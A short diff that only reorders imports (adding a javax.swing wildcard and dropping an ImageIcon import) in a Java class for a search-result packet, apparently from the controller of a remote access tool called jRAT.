@@ -5,8 +5,8 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameRemoteFiles;
 import jrat.controller.ui.panels.PanelSearchFiles;
 
+import javax.swing.*;
 import java.io.DataInputStream;
-import javax.swing.ImageIcon;
 
 public class Packet37SearchResult extends AbstractIncomingPacket {
 
